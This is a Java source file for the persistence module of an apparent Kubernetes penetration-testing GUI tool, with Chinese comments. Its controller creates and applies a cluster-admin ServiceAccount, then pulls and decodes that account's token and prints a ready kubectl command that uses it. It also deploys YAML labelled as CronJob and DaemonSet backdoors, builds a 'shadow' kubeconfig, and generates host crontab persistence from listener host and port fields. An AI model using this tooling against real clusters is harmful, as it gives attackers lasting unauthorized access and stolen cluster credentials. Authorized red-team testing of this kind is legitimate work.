package com.k8spen.tool.controller;

import com.k8spen.tool.helper.PersistenceHelper;
import com.k8spen.tool.utils.KubectlUtil;
import javafx.concurrent.Task;
import javafx.scene.control.*;

/**
 * 3.权限维持 — 高权SA / CronJob / DaemonSet / 影子Kubeconfig / 宿主机持久化
 */
public class PersistHandler {

    private final ControllerContext ctx;
    private final ExecHandler execHandler; // 共用 generatePersistKubeconfig

    // SA
    private final TextField persistSANamespace, persistSAName, persistSARoleName;
    private final TextArea persistSAOutput;
    // CronJob
    private final TextField persistCronNs, persistCronName, persistCronImage, persistCronSchedule, persistCronCmd;
    private final TextArea persistCronOutput;
    // DaemonSet
    private final TextField persistDsNs, persistDsName, persistDsImage, persistDsMountPath, persistDsCmd;
    private final TextArea persistDsOutput;
    // Kubeconfig
    private final TextField persistKcServer, persistKcCluster;
    private final TextArea persistKcToken, persistKcOutput;
    // Host
    private final TextField persistHostLhost, persistHostLport;
    private final TextArea persistHostOutput;
    // 连接模式
    private final ComboBox<String> persistConnMode;
    private final TextField persistUsername;
    private final PasswordField persistPassword;
    // kubeconfig文本 (共享)
    private final TextArea kubeconfigContent;

    public PersistHandler(ControllerContext ctx, ExecHandler execHandler,
                          TextField persistSANamespace, TextField persistSAName, TextField persistSARoleName,
                          TextArea persistSAOutput,
                          TextField persistCronNs, TextField persistCronName, TextField persistCronImage,
                          TextField persistCronSchedule, TextField persistCronCmd, TextArea persistCronOutput,
                          TextField persistDsNs, TextField persistDsName, TextField persistDsImage,
                          TextField persistDsMountPath, TextField persistDsCmd, TextArea persistDsOutput,
                          TextField persistKcServer, TextField persistKcCluster,
                          TextArea persistKcToken, TextArea persistKcOutput,
                          TextField persistHostLhost, TextField persistHostLport, TextArea persistHostOutput,
                          ComboBox<String> persistConnMode, TextField persistUsername, PasswordField persistPassword,
                          TextArea kubeconfigContent) {
        this.ctx = ctx; this.execHandler = execHandler;
        this.persistSANamespace = persistSANamespace; this.persistSAName = persistSAName;
        this.persistSARoleName = persistSARoleName; this.persistSAOutput = persistSAOutput;
        this.persistCronNs = persistCronNs; this.persistCronName = persistCronName;
        this.persistCronImage = persistCronImage; this.persistCronSchedule = persistCronSchedule;
        this.persistCronCmd = persistCronCmd; this.persistCronOutput = persistCronOutput;
        this.persistDsNs = persistDsNs; this.persistDsName = persistDsName;
        this.persistDsImage = persistDsImage; this.persistDsMountPath = persistDsMountPath;
        this.persistDsCmd = persistDsCmd; this.persistDsOutput = persistDsOutput;
        this.persistKcServer = persistKcServer; this.persistKcCluster = persistKcCluster;
        this.persistKcToken = persistKcToken; this.persistKcOutput = persistKcOutput;
        this.persistHostLhost = persistHostLhost; this.persistHostLport = persistHostLport;
        this.persistHostOutput = persistHostOutput;
        this.persistConnMode = persistConnMode; this.persistUsername = persistUsername;
        this.persistPassword = persistPassword; this.kubeconfigContent = kubeconfigContent;
    }

    // ================ 高权SA ================

    public void persistGenAdminSA() {
        String yaml = PersistenceHelper.generateAdminSA(persistSANamespace.getText().trim(), persistSAName.getText().trim(), persistSARoleName.getText().trim());
        persistSAOutput.setText(yaml);
        ctx.log("[+] 已生成高权SA YAML");
    }

    public void persistApplyAdminSA() {
        String yaml = persistSAOutput.getText();
        if (yaml == null || yaml.trim().isEmpty() || !yaml.contains("apiVersion")) { persistSAOutput.setText("[-] 请先生成YAML"); return; }
        applyYamlAsync(yaml, persistSAOutput, "高权SA");
    }

    public void persistGetSAToken() {
        String ns = persistSANamespace.getText().trim();
        String name = persistSAName.getText().trim();
        if (ns.isEmpty()) ns = "kube-system"; if (name.isEmpty()) name = "admin-user";
        String secretName = name + "-token";
        String mode = persistConnMode != null && persistConnMode.getValue() != null ? persistConnMode.getValue() : "";
        String host = ctx.getHost(); String token = ctx.getToken();
        String username = persistUsername != null ? persistUsername.getText().trim() : "";
        String password = persistPassword != null ? persistPassword.getText().trim() : "";
        ctx.log("[*] 获取SA Token: " + ns + "/" + secretName);
        ctx.setStatus("获取SA Token中...");
        String fNs = ns; String fSecretName = secretName;
        Task<String> task = new Task<>() {
            @Override protected String call() throws Exception {
                String[] args = {"get", "secret", fSecretName, "-n", fNs, "-o", "jsonpath={.data.token}"};
                if (mode.contains("Kubeconfig")) {
                    String kcText = kubeconfigContent != null ? kubeconfigContent.getText() : "";
                    return KubectlUtil.execWithKubeconfig(KubectlUtil.saveKubeconfig(kcText), ctx.getTimeout(), args);
                } else {
                    String useToken = (token != null && !token.isEmpty()) ? token : null;
                    String useUser = !username.isEmpty() ? username : null;
                    String usePass = !password.isEmpty() ? password : null;
                    return KubectlUtil.exec(ctx.getApiBaseUrl(), useToken, useUser, usePass, true, ctx.getTimeout(), args);
                }
            }
        };
        task.setOnSucceeded(e -> {
            String result = task.getValue();
            ctx.log("[*] 执行: " + KubectlUtil.lastCommand);
            if (result.startsWith("[Exit code:")) {
                persistSAOutput.setText(persistSAOutput.getText() + "\n\n[-] 获取失败:\n" + result);
            } else {
                String b64Token = result.trim(); String decoded = b64Token;
                try { decoded = new String(java.util.Base64.getDecoder().decode(b64Token)); } catch (Exception ignored) {}
                persistSAOutput.setText(persistSAOutput.getText() + "\n\n# ===== SA Token =====\n# Base64: " + (b64Token.length() > 40 ? b64Token.substring(0, 40) + "..." : b64Token) + "\n# Decoded:\n" + decoded + "\n\n# 使用方法:\nkubectl --server=" + ctx.getApiBaseUrl() + " --token=" + decoded + " --insecure-skip-tls-verify=true get pods\n");
                ctx.setStatus("SA Token获取成功"); ctx.log("[+] SA Token获取成功");
            }
        });
        task.setOnFailed(e -> persistSAOutput.setText(persistSAOutput.getText() + "\n\n[-] 获取失败: " + (task.getException() != null ? task.getException().getMessage() : "")));
        new Thread(task).start();
    }

    public void persistCopyOutput() { if (persistSAOutput.getText() != null) ctx.copyToClipboard(persistSAOutput.getText()); }

    // ================ CronJob ================

    public void persistGenCronJob() {
        persistCronOutput.setText(PersistenceHelper.generateCronJob(persistCronNs.getText().trim(), persistCronName.getText().trim(), persistCronImage.getText().trim(), persistCronSchedule.getText().trim(), persistCronCmd.getText().trim()));
        ctx.log("[+] 已生成CronJob后门YAML");
    }
    public void persistApplyCronJob() {
        String yaml = persistCronOutput.getText();
        if (yaml == null || yaml.trim().isEmpty() || !yaml.contains("apiVersion")) { persistCronOutput.setText("[-] 请先生成YAML"); return; }
        applyYamlAsync(yaml, persistCronOutput, "CronJob后门");
    }
    public void persistCopyCronOutput() { if (persistCronOutput.getText() != null) ctx.copyToClipboard(persistCronOutput.getText()); }

    // ================ DaemonSet ================

    public void persistGenDaemonSet() {
        persistDsOutput.setText(PersistenceHelper.generateDaemonSet(persistDsNs.getText().trim(), persistDsName.getText().trim(), persistDsImage.getText().trim(), persistDsMountPath.getText().trim(), persistDsCmd.getText().trim()));
        ctx.log("[+] 已生成DaemonSet后门YAML");
    }
    public void persistApplyDaemonSet() {
        String yaml = persistDsOutput.getText();
        if (yaml == null || yaml.trim().isEmpty() || !yaml.contains("apiVersion")) { persistDsOutput.setText("[-] 请先生成YAML"); return; }
        applyYamlAsync(yaml, persistDsOutput, "DaemonSet后门");
    }
    public void persistCopyDsOutput() { if (persistDsOutput.getText() != null) ctx.copyToClipboard(persistDsOutput.getText()); }

    // ================ 影子Kubeconfig ================

    public void persistGenKubeconfig() {
        persistKcOutput.setText(PersistenceHelper.generateKubeconfig(persistKcServer.getText().trim(), persistKcToken.getText().trim(), persistKcCluster.getText().trim()));
        ctx.log("[+] 已生成影子Kubeconfig");
    }
    public void persistFillFromTarget() {
        String base = ctx.getApiBaseUrl(); if (base != null && !base.isEmpty()) persistKcServer.setText(base);
        String token = ctx.getToken(); if (token != null && !token.isEmpty()) persistKcToken.setText(token);
        ctx.log("[*] 已从目标配置填充");
    }
    public void persistCopyKcOutput() { if (persistKcOutput.getText() != null) ctx.copyToClipboard(persistKcOutput.getText()); }

    // ================ 宿主机持久化 ================

    public void persistGenHostPersist() {
        persistHostOutput.setText(PersistenceHelper.generateHostCrontab(persistHostLhost.getText().trim(), persistHostLport.getText().trim()));
        ctx.log("[+] 已生成宿主机持久化命令");
    }
    public void persistCopyHostOutput() { if (persistHostOutput.getText() != null) ctx.copyToClipboard(persistHostOutput.getText()); }

    // ================ 工具方法 ================

    private String extractYaml(String text) {
        if (text == null) return "";
        int dashIdx = text.indexOf("---");
        if (dashIdx >= 0) text = text.substring(dashIdx);
        StringBuilder sb = new StringBuilder();
        for (String line : text.split("\n")) {
            if (line.startsWith("[Exit code:") || line.startsWith("[-]") || line.startsWith("# ===== ") || line.startsWith("Please enter")) break;
            sb.append(line).append("\n");
        }
        return sb.toString().trim() + "\n";
    }

    private void applyYamlAsync(String yaml, TextArea output, String label) {
        String mode = persistConnMode != null && persistConnMode.getValue() != null ? persistConnMode.getValue() : "";
        String host = ctx.getHost(); String token = ctx.getToken();
        String username = persistUsername != null ? persistUsername.getText().trim() : "";
        String password = persistPassword != null ? persistPassword.getText().trim() : "";
        ctx.setStatus("正在部署" + label + "..."); ctx.log("[*] 部署" + label + "...");
        String cleanYaml = extractYaml(yaml);
        Task<String> task = new Task<>() {
            @Override protected String call() throws Exception {
                String yamlPath = KubectlUtil.saveYaml(cleanYaml);
                if (mode.contains("Kubeconfig")) {
                    String kcText = kubeconfigContent != null ? kubeconfigContent.getText() : "";
                    return KubectlUtil.execWithKubeconfig(KubectlUtil.saveKubeconfig(kcText), ctx.getTimeout(), "apply", "-f", yamlPath);
                } else {
                    String kcPath = execHandler.generatePersistKubeconfig(host, token, username, password);
                    return KubectlUtil.execWithKubeconfig(kcPath, ctx.getTimeout(), "apply", "-f", yamlPath);
                }
            }
        };
        task.setOnSucceeded(e -> {
            String result = task.getValue();
            ctx.log("[*] 执行: " + KubectlUtil.lastCommand);
            if (result.startsWith("[Exit code:")) { output.setText(output.getText() + "\n\n" + result); ctx.setStatus(label + "部署失败"); }
            else { output.setText(output.getText() + "\n\n# ===== 部署结果 =====\n" + result); ctx.setStatus(label + "部署成功"); ctx.log("[+] " + label + "部署成功"); }
        });
        task.setOnFailed(e -> { output.setText(output.getText() + "\n\n[-] 部署失败: " + (task.getException() != null ? task.getException().getMessage() : "")); ctx.setStatus(label + "部署失败"); });
        new Thread(task).start();
    }
}
